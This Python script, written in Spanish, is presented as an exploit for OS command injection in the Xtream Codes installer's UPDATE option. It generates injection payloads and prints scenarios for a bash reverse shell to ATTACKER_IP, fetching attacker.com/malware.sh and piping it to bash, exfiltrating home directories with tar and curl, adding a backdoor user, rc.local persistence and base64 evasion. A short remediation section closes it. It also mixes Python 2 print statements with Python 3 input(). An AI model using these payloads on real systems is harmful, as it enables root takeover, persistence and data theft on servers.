#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
EXPLOIT: Command Injection durante UPDATE de Xtream Codes
VULNERABILIDAD: VULN-001 - OS Command Injection
SEVERIDAD: CRÍTICA
CVSS: 9.8

Descripción:
    El instalador de Xtream Codes usa os.system() con input de usuario
    sin sanitización cuando se selecciona la opción UPDATE.
    
    Al ingresar un URL malicioso, se pueden inyectar comandos arbitrarios
    que se ejecutarán con privilegios de root.

Impacto:
    - Ejecución Remota de Código (RCE)
    - Control total del servidor
    - Instalación de backdoors
    - Robo de datos
    - Pivoting a otros sistemas

Autor: Security Research
Fecha: 2026-01-28
Propósito: Educativo y auditoría de seguridad

ADVERTENCIA: Solo usar con autorización explícita
"""

import sys
import os

class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'


def print_banner():
    """Imprime banner del exploit"""
    banner = """
{}╔═══════════════════════════════════════════════════════════╗
║  Xtream Codes Command Injection Exploit                ║
║  Vulnerability: VULN-001 - OS Command Injection        ║
║  Severity: CRITICAL (CVSS 9.8)                         ║
║  Attack Vector: Network                                ║
║  Privileges Required: None                             ║
╚═══════════════════════════════════════════════════════════╝{}
    """.format(Colors.HEADER, Colors.ENDC)
    print(banner)


def generate_payload(command, output_file='/tmp/pwned.txt'):
    """
    Genera un payload de command injection
    
    Args:
        command (str): Comando a ejecutar
        output_file (str): Archivo donde guardar el output
        
    Returns:
        str: Payload malicioso
    """
    # Técnica: Terminar el comando wget con ; y añadir comando malicioso
    # El # comenta el resto de la línea
    payload = 'http://example.com/file.zip"; {} > {} #'.format(command, output_file)
    return payload


def show_vulnerable_code():
    """Muestra el código vulnerable"""
    print "{}[*]{} CÓDIGO VULNERABLE:\n".format(Colors.OKBLUE, Colors.ENDC)
    
    vulnerable_code = """
{}    # install.py - Líneas 95-96, 106-114
    rlink = input('Enter the link of release_xyz.zip file:\\n')
    
    # ... validación INEXISTENTE ...
    
    rURL = rlink
    os.system('wget -q -O "/tmp/update.zip" "%s"' % rURL)  # <-- VULNERABLE!
    {}
    """.format(Colors.WARNING, Colors.ENDC)
    
    print(vulnerable_code)


def show_attack_scenarios():
    """Muestra diferentes escenarios de ataque"""
    print "\n{}[*]{} ESCENARIOS DE ATAQUE:\n".format(Colors.OKBLUE, Colors.ENDC)
    
    scenarios = [
        {
            'name': '1. Crear archivo de prueba (PoC básico)',
            'command': 'touch /tmp/pwned.txt',
            'payload': generate_payload('touch /tmp/pwned.txt', '/dev/null')
        },
        {
            'name': '2. Extraer información del sistema',
            'command': 'uname -a; whoami; id',
            'payload': generate_payload('uname -a; whoami; id', '/tmp/system_info.txt')
        },
        {
            'name': '3. Leer archivo /etc/passwd',
            'command': 'cat /etc/passwd',
            'payload': generate_payload('cat /etc/passwd', '/tmp/passwd_dump.txt')
        },
        {
            'name': '4. Instalar reverse shell',
            'command': 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1',
            'payload': generate_payload('bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1', '/dev/null')
        },
        {
            'name': '5. Añadir usuario backdoor al sistema',
            'command': 'useradd -m -p $(openssl passwd -1 hacked123) backdoor',
            'payload': generate_payload('useradd -m -p $(openssl passwd -1 hacked123) backdoor', '/tmp/user_created.txt')
        },
        {
            'name': '6. Descargar y ejecutar script malicioso',
            'command': 'curl http://attacker.com/malware.sh | bash',
            'payload': generate_payload('curl http://attacker.com/malware.sh | bash', '/dev/null')
        },
        {
            'name': '7. Exfiltrar datos sensibles',
            'command': 'tar czf - /home/xtreamcodes | curl -X POST -F "data=@-" http://attacker.com/exfil',
            'payload': generate_payload('tar czf - /home/xtreamcodes | curl -X POST -F \\"data=@-\\" http://attacker.com/exfil', '/dev/null')
        },
        {
            'name': '8. Modificar script de inicio para persistencia',
            'command': 'echo "bash -c \\"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\\"" >> /etc/rc.local',
            'payload': generate_payload('echo \\"bash -c \\\\\\\"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\\\\\\\"\\" >> /etc/rc.local', '/dev/null')
        }
    ]
    
    for i, scenario in enumerate(scenarios):
        print "{}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{}".format(Colors.OKBLUE, Colors.ENDC)
        print "{}{}{}".format(Colors.BOLD, scenario['name'], Colors.ENDC)
        print "{}[CMD]{} {}".format(Colors.WARNING, Colors.ENDC, scenario['command'])
        print "{}[PAYLOAD]{}".format(Colors.FAIL, Colors.ENDC)
        print "  {}".format(scenario['payload'])
        print("")


def show_exploitation_steps():
    """Muestra los pasos para explotar la vulnerabilidad"""
    print "\n{}[*]{} PASOS DE EXPLOTACIÓN:\n".format(Colors.OKBLUE, Colors.ENDC)
    
    steps = """
{}1. Ejecutar el instalador en el servidor víctima:{}
   sudo python install.py

{}2. Seleccionar opción UPDATE:{}
   Installation Type [MAIN, LB, UPDATE]: UPDATE

{}3. Cuando pida el link, inyectar el payload:{}
   Enter the link of release_xyz.zip file:
   
   Example: https://github.com/.../release_22f.zip
   
   Now enter the link:
   
   {}http://example.com/file.zip"; touch /tmp/PWNED.txt #{}

{}4. El comando se ejecutará con privilegios de ROOT{}

{}5. Verificar explotación:{}
   ls -la /tmp/PWNED.txt
    """.format(
        Colors.OKGREEN, Colors.ENDC,
        Colors.OKGREEN, Colors.ENDC,
        Colors.OKGREEN, Colors.ENDC,
        Colors.FAIL, Colors.ENDC,
        Colors.OKGREEN, Colors.ENDC,
        Colors.OKGREEN, Colors.ENDC
    )
    
    print(steps)


def show_advanced_exploitation():
    """Muestra técnicas avanzadas de explotación"""
    print "\n{}[*]{} EXPLOTACIÓN AVANZADA - REVERSE SHELL:\n".format(Colors.OKBLUE, Colors.ENDC)
    
    advanced = """
{}PASO 1 - En tu máquina (atacante):{}
   # Iniciar listener en puerto 4444
   nc -lvnp 4444

{}PASO 2 - Generar payload:{}
   ATTACKER_IP="YOUR_IP_HERE"
   PAYLOAD='http://x.com/x.zip"; bash -c \\'bash -i >& /dev/tcp/'$ATTACKER_IP'/4444 0>&1\\' #'

{}PASO 3 - Ejecutar en servidor víctima:{}
   sudo python install.py
   > UPDATE
   > [Pegar PAYLOAD]

{}PASO 4 - Obtener shell root:{}
   Conexión recibida en nc listener!
   root@victim:/#

{}TÉCNICAS DE EVASIÓN:{}
   # Ofuscación con base64
   {}'http://x.com/x.zip"; echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjIuMy40LzQ0NDQgMD4mMQ==" | base64 -d | bash #'{}
   
   # Doble encoding
   {}'http://x.com/x.zip"; %62%61%73%68%20%2D%69 #'{}
   
   # Usando variables de entorno
   {}'http://x.com/x.zip"; export X=/tmp/x.sh; echo "malicious code" > $X; bash $X #'{}
    """.format(
        Colors.OKGREEN, Colors.ENDC,
        Colors.OKGREEN, Colors.ENDC,
        Colors.OKGREEN, Colors.ENDC,
        Colors.OKGREEN, Colors.ENDC,
        Colors.OKGREEN, Colors.ENDC,
        Colors.WARNING, Colors.ENDC,
        Colors.WARNING, Colors.ENDC,
        Colors.WARNING, Colors.ENDC
    )
    
    print(advanced)


def show_remediation():
    """Muestra cómo remediar la vulnerabilidad"""
    print "\n{}[*]{} REMEDIACIÓN:\n".format(Colors.OKBLUE, Colors.ENDC)
    
    fix = """
{}CÓDIGO VULNERABLE (ANTES):{}
    rURL = rlink
    os.system('wget -q -O "/tmp/update.zip" "%s"' % rURL)

{}CÓDIGO SEGURO (DESPUÉS):{}
    import subprocess
    import re
    
    # 1. Validar URL
    if not re.match(r'^https?://', rlink):
        raise ValueError("URL inválida")
    
    # 2. Usar subprocess con lista de argumentos
    try:
        subprocess.run(
            ['wget', '-q', '-O', '/tmp/update.zip', rlink],
            check=True,
            timeout=300
        )
    except subprocess.CalledProcessError as e:
        print("Error descargando archivo")
        sys.exit(1)

{}MEDIDAS ADICIONALES:{}
    - Validar formato de URL con regex estricto
    - Whitelist de dominios permitidos
    - Verificar hash SHA256 del archivo descargado
    - Ejecutar con usuario sin privilegios
    - Logging de todas las acciones
    - Rate limiting
    """.format(
        Colors.FAIL, Colors.ENDC,
        Colors.OKGREEN, Colors.ENDC,
        Colors.OKBLUE, Colors.ENDC
    )
    
    print(fix)


def main():
    """Función principal"""
    print_banner()
    
    print "{}[!]{} Este exploit demuestra command injection en Xtream UI Installer".format(Colors.WARNING, Colors.ENDC)
    print "{}[!]{} Usar solo con autorización explícita\n".format(Colors.WARNING, Colors.ENDC)
    
    # Mostrar información del exploit
    show_vulnerable_code()
    show_attack_scenarios()
    show_exploitation_steps()
    show_advanced_exploitation()
    show_remediation()
    
    print "\n{}╔═══════════════════════════════════════════════════════════╗".format(Colors.HEADER)
    print "{}║  {}DISCLAIMER{}{}                                             ║".format(Colors.HEADER, Colors.BOLD, Colors.ENDC, Colors.HEADER)
    print "{}║  Este código es solo para fines educativos             ║".format(Colors.HEADER)
    print "{}║  El uso no autorizado es ILEGAL                        ║".format(Colors.HEADER)
    print "{}║  El autor no se responsabiliza por mal uso             ║".format(Colors.HEADER)
    print "{}╚═══════════════════════════════════════════════════════════╝{}\n".format(Colors.HEADER, Colors.ENDC)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print "\n{}[!]{} Saliendo...\n".format(Colors.WARNING, Colors.ENDC)
        sys.exit(0)
